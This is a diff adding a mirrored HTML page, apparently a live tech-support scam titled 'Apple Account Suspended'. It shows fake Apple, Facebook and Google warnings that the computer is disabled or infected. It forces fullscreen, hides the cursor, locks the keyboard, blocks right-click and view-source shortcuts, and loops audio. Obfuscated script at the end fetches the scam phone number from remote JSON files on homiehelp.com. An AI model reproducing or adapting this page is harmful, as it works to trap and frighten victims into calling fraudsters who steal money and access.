@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from err0r-jrkfygmt.pages.dev/folder2/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Jan 2025 15:25:10 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+<head>
+    <title>Apple Account Suspended</title>
+    <style>
+        body {
+            background-image: url('bg1.png');
+            background-size: 100% 100%;
+            background-repeat: no-repeat;
+            background-position: center center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            color: white;
+        }
+
+        body.g {
+            background-image: url('bgg.png');
+        }
+
+        body.fullscreen {
+            background-image: url('bg2.jpg');
+        }
+
+        #support-text {
+            position: absolute;
+            top: 80%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 24px;
+            text-align: center;
+            width: 100%;
+            font-weight: bold;
+            color: black;
+            display: none;
+        }
+
+        #support-text span {
+            font-weight: normal;
+        }
+
+        #music {
+            display: none;
+        }
+
+        #modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+        }
+
+        #modal-content {
+            background-color: white;
+            border-radius: 5px;
+            max-width: 400px;
+            margin: 100px auto;
+            padding: 20px;
+            text-align: center;
+        }
+
+        #modal-close {
+            cursor: pointer;
+            color: #888;
+            float: right;
+            font-size: 20px;
+            font-weight: bold;
+        }
+
+        #modal-message {
+            color: black;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        #modal-image {
+            margin-bottom: 20px;
+        }
+
+        .modal-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+        }
+
+        .modal-buttons button {
+            width: 100px;
+            padding: 10px 0;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .modal-buttons button.accept {
+            background-color: white;
+            color: black;
+        }
+
+        .modal-buttons button.dismiss {
+            background-color: #3b5998;
+            color: white;
+        }
+
+        .modal-buttons button:hover {
+            background-color: rgba(0, 0, 0, 0.8);
+        }
+
+        @keyframes blink {
+            0% {
+                opacity: 1;
+            }
+
+            50% {
+                opacity: 0;
+            }
+
+            100% {
+                opacity: 1;
+            }
+        }
+
+        .modal-buttons button.dismiss.blinking {
+            animation: blink 1s infinite;
+        }
+
+        #welcomeDiv {
+            display: none;
+            background-color: #000;
+            height: auto;
+            width: 550px;
+            position: fixed;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            z-index: 9999999999;
+            text-align: center;
+        }
+
+        #welcomeDiv p {
+            color: #FEFEFE;
+            margin-top: 10px;
+            font-size: 16px;
+            opacity: 0.9;
+        }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            var isPopupVisible = true;
+            var music = document.getElementById('music');
+            var isPlaying = false;
+
+            function toggleMusic() {
+                if (isPlaying) {
+                    music.pause();
+                } else {
+                    music.play();
+                }
+                isPlaying = !isPlaying;
+            }
+
+            function playMusicOnClick() {
+                toggleMusic();
+                document.removeEventListener('click', playMusicOnClick);
+            }
+
+            music.addEventListener('click', toggleMusic);
+            document.addEventListener('click', playMusicOnClick);
+
+            var fullscreenEnabled = document.fullscreenEnabled || document.mozFullScreenEnabled || document.documentElement.webkitRequestFullScreen;
+
+            if (fullscreenEnabled) {
+                document.documentElement.requestFullscreen = document.documentElement.requestFullscreen || document.documentElement.mozRequestFullScreen || document.documentElement.webkitRequestFullScreen;
+                document.cancelFullscreen = document.cancelFullscreen || document.mozCancelFullScreen || document.webkitCancelFullScreen;
+
+                var isFullscreen = false;
+
+                document.addEventListener('click', function () {
+                    if (!isFullscreen) {
+                        isFullscreen = true;
+                        document.documentElement.requestFullscreen();
+                        document.body.classList.add('fullscreen');
+                        showWelcomeDiv();
+                        showSupportText();
+                    }
+                });
+
+                document.addEventListener('fullscreenchange', function () {
+                    isFullscreen = !isFullscreen;
+                });
+            }
+
+            var modalOverlay = document.getElementById('modal-overlay');
+            var modalClose = document.getElementById('modal-close');
+
+            function showModal() {
+                modalOverlay.style.display = 'block';
+            }
+
+            function closeModal() {
+                modalOverlay.style.display = 'none';
+            }
+
+            modalClose.addEventListener('click', closeModal);
+
+            showModal();
+
+            function hideCursor() {
+                document.documentElement.style.cursor = 'none';
+            }
+
+            document.addEventListener('click', function () {
+                hideCursor();
+                document.removeEventListener('click', hideCursor);
+                if (isPopupVisible) {
+                    closeModal();
+                    isPopupVisible = false;
+                }
+            });
+
+            var acceptButton = document.getElementById('modal-accept');
+            var dismissButton = document.getElementById('modal-dismiss');
+
+            acceptButton.addEventListener('click', closeModal);
+            dismissButton.addEventListener('click', closeModal);
+
+            document.addEventListener('contextmenu', function (event) {
+                event.preventDefault();
+            });
+
+            document.addEventListener('keydown', function (e) {
+                if (e.ctrlKey && (e.keyCode === 'U'.charCodeAt(0) || e.keyCode === 'u'.charCodeAt(0)) ||
+                    e.ctrlKey && (e.keyCode === 'C'.charCodeAt(0) || e.keyCode === 'c'.charCodeAt(0)) ||
+                    e.ctrlKey && (e.keyCode === 'S'.charCodeAt(0) || e.keyCode === 's'.charCodeAt(0))) {
+                    e.preventDefault();
+                }
+            });
+
+            function preventKeyEvents(event) {
+                const blockedKeyCodes = [123];
+                const keyCode = event.keyCode || event.which;
+
+                if (blockedKeyCodes.includes(keyCode)) {
+                    event.preventDefault();
+                    console.log(`Key with code ${keyCode} is blocked.`);
+                }
+            }
+
+            window.addEventListener('keydown', preventKeyEvents);
+        });
+
+        navigator.keyboard.lock();
+        document.onkeydown = function (e) {
+            return false;
+        }
+
+        function showWelcomeDiv() {
+            var welcomeDiv = document.getElementById('welcomeDiv');
+            welcomeDiv.style.display = 'block';
+        }
+
+        function showSupportText() {
+            var supportText = document.getElementById('support-text');
+            supportText.style.display = 'block';
+        }
+    </script>
+</head>
+
+<body>
+    <audio id="music" src="text-to-speech.mp3" controls loop></audio>
+
+    <div id="modal-overlay">
+        <div id="modal-content">
+            <span id="modal-close">&times;</span>
+            <img id="modal-image" src="logofb.jpg" alt="Facebook Logo">
+            <p id="modal-message">Facebook Has Temporarily Suspended Your Account.</p>
+            <div class="modal-buttons">
+                <button id="modal-accept" class="accept">Accept</button>
+                <button id="modal-dismiss" class="dismiss blinking">Ignore</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="welcomeDiv">
+        <p>
+            Apple Has Disabled Your Computer.<br>
+            Please Contact Apple Support To Unlock Your Computer.<br>Toll Free <strong id="t1"></strong>
+        </p>
+    </div>
+
+    <div id="support-text">Call Apple Support Toll Free <strong id="t2"></strong></div>
+
+    <script>
+        function _0x5c13(_0x5c1b7b,_0x2cd065){const _0x580412=_0x5804();return _0x5c13=function(_0x5c13c4,_0x709c60){_0x5c13c4=_0x5c13c4-0x181;let _0x410be0=_0x580412[_0x5c13c4];return _0x410be0;},_0x5c13(_0x5c1b7b,_0x2cd065);}const _0xfccd21=_0x5c13;(function(_0x27f2a6,_0x5c3e7f){const _0x1ff81a=_0x5c13,_0x14f8b2=_0x27f2a6();while(!![]){try{const _0x973d68=parseInt(_0x1ff81a(0x184))/0x1*(parseInt(_0x1ff81a(0x197))/0x2)+-parseInt(_0x1ff81a(0x191))/0x3+parseInt(_0x1ff81a(0x19e))/0x4*(-parseInt(_0x1ff81a(0x194))/0x5)+-parseInt(_0x1ff81a(0x19b))/0x6+parseInt(_0x1ff81a(0x18f))/0x7*(-parseInt(_0x1ff81a(0x182))/0x8)+parseInt(_0x1ff81a(0x18c))/0x9+parseInt(_0x1ff81a(0x183))/0xa;if(_0x973d68===_0x5c3e7f)break;else _0x14f8b2['push'](_0x14f8b2['shift']());}catch(_0x48eac7){_0x14f8b2['push'](_0x14f8b2['shift']());}}}(_0x5804,0x3c54c));function _0x5804(){const _0x4b8aab=['https://homiehelp.com/topg.json','search','Error\x20loading\x20tfn\x20value','tfn','glogo.png','error','google','40xoedve','5752970hLVKuq','3983VBFZZT','classList','catch','Error\x20fetching\x20or\x20processing\x20data:','GET','getElementById','modal-message','has','3834594HQossJ','fbnft','then','474838Zyvicg','Google\x20Found\x20A\x20Virus\x20On\x20Your\x20Computer.','50829OZirVD','json','body','5bToJyu','src','Network\x20response\x20was\x20not\x20ok','10tBueyH','https://homiehelp.com/fbnfn.json','https://homiehelp.com/fb.json','https://homiehelp.com/fbnft.json','727488GRRoEj','textContent','application/json','1187204CBqXfk'];_0x5804=function(){return _0x4b8aab;};return _0x5804();}const urlParams=new URLSearchParams(window['location'][_0xfccd21(0x1a0)]);if(urlParams['has'](_0xfccd21(0x181)))document[_0xfccd21(0x193)][_0xfccd21(0x185)]['add']('g'),document[_0xfccd21(0x189)]('modal-image')[_0xfccd21(0x195)]=_0xfccd21(0x1a3),document['getElementById'](_0xfccd21(0x18a))[_0xfccd21(0x19c)]=_0xfccd21(0x190),fetch(_0xfccd21(0x19f),{'method':_0xfccd21(0x188),'headers':{'Accept':_0xfccd21(0x19d)}})[_0xfccd21(0x18e)](_0x5b747b=>{const _0x5cbf5c=_0xfccd21;if(!_0x5b747b['ok'])throw new Error(_0x5cbf5c(0x196));return _0x5b747b[_0x5cbf5c(0x192)]();})[_0xfccd21(0x18e)](_0x5eaf60=>{const _0x40bda6=_0xfccd21,_0x3be26e=_0x5eaf60[_0x40bda6(0x1a2)],_0x542d24=document[_0x40bda6(0x189)]('t1'),_0x20d342=document[_0x40bda6(0x189)]('t2');_0x542d24['textContent']=_0x3be26e,_0x20d342[_0x40bda6(0x19c)]=_0x3be26e;})[_0xfccd21(0x186)](_0x43b56d=>{const _0x45c137=_0xfccd21;console['error'](_0x45c137(0x187),_0x43b56d);const _0x373200=document['getElementById']('t1'),_0xcbdf7c=document[_0x45c137(0x189)]('t2');_0x373200[_0x45c137(0x19c)]=_0x45c137(0x1a1),_0xcbdf7c[_0x45c137(0x19c)]='Error\x20loading\x20tfn\x20value';});else{if(urlParams['has'](_0xfccd21(0x18d)))fetch(_0xfccd21(0x19a),{'method':_0xfccd21(0x188),'headers':{'Accept':_0xfccd21(0x19d)}})[_0xfccd21(0x18e)](_0x428305=>{const _0x4ab4ef=_0xfccd21;if(!_0x428305['ok'])throw new Error('Network\x20response\x20was\x20not\x20ok');return _0x428305[_0x4ab4ef(0x192)]();})[_0xfccd21(0x18e)](_0x34b82d=>{const _0x15bf71=_0xfccd21,_0x5aac68=_0x34b82d[_0x15bf71(0x1a2)],_0x199d53=document['getElementById']('t1'),_0x547f29=document[_0x15bf71(0x189)]('t2');_0x199d53['textContent']=_0x5aac68,_0x547f29[_0x15bf71(0x19c)]=_0x5aac68;})[_0xfccd21(0x186)](_0x49bd0e=>{const _0x3f625a=_0xfccd21;console[_0x3f625a(0x1a4)]('Error\x20fetching\x20or\x20processing\x20data:',_0x49bd0e);const _0x592975=document[_0x3f625a(0x189)]('t1'),_0x5eee7a=document[_0x3f625a(0x189)]('t2');_0x592975[_0x3f625a(0x19c)]='Error\x20loading\x20tfn\x20value',_0x5eee7a[_0x3f625a(0x19c)]=_0x3f625a(0x1a1);});else urlParams[_0xfccd21(0x18b)]('fbnfn')?fetch(_0xfccd21(0x198),{'method':_0xfccd21(0x188),'headers':{'Accept':_0xfccd21(0x19d)}})['then'](_0x3532d3=>{const _0x3de87e=_0xfccd21;if(!_0x3532d3['ok'])throw new Error(_0x3de87e(0x196));return _0x3532d3[_0x3de87e(0x192)]();})[_0xfccd21(0x18e)](_0x5e49a0=>{const _0x2b369d=_0xfccd21,_0x6a70f9=_0x5e49a0[_0x2b369d(0x1a2)],_0x5c81a0=document[_0x2b369d(0x189)]('t1'),_0x1dda5e=document[_0x2b369d(0x189)]('t2');_0x5c81a0['textContent']=_0x6a70f9,_0x1dda5e[_0x2b369d(0x19c)]=_0x6a70f9;})[_0xfccd21(0x186)](_0x2f5379=>{const _0x5aa6f9=_0xfccd21;console[_0x5aa6f9(0x1a4)](_0x5aa6f9(0x187),_0x2f5379);const _0x56822d=document[_0x5aa6f9(0x189)]('t1'),_0x36c420=document[_0x5aa6f9(0x189)]('t2');_0x56822d[_0x5aa6f9(0x19c)]=_0x5aa6f9(0x1a1),_0x36c420['textContent']='Error\x20loading\x20tfn\x20value';}):fetch(_0xfccd21(0x199),{'method':_0xfccd21(0x188),'headers':{'Accept':_0xfccd21(0x19d)}})[_0xfccd21(0x18e)](_0x450a62=>{const _0x2723cd=_0xfccd21;if(!_0x450a62['ok'])throw new Error(_0x2723cd(0x196));return _0x450a62[_0x2723cd(0x192)]();})['then'](_0x5672ed=>{const _0x4047ae=_0xfccd21,_0x121b3d=_0x5672ed[_0x4047ae(0x1a2)],_0x1ffe16=document[_0x4047ae(0x189)]('t1'),_0x408668=document[_0x4047ae(0x189)]('t2');_0x1ffe16[_0x4047ae(0x19c)]=_0x121b3d,_0x408668[_0x4047ae(0x19c)]=_0x121b3d;})['catch'](_0xedbc0f=>{const _0x2645f9=_0xfccd21;console['error'](_0x2645f9(0x187),_0xedbc0f);const _0x17cf3a=document[_0x2645f9(0x189)]('t1'),_0x2d7004=document[_0x2645f9(0x189)]('t2');_0x17cf3a[_0x2645f9(0x19c)]='Error\x20loading\x20tfn\x20value',_0x2d7004[_0x2645f9(0x19c)]=_0x2645f9(0x1a1);});}
+    </script>
+</body>
+
+
+
+<!-- Mirrored from err0r-jrkfygmt.pages.dev/folder2/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 14 Jan 2025 15:25:11 GMT -->
+</html>
+
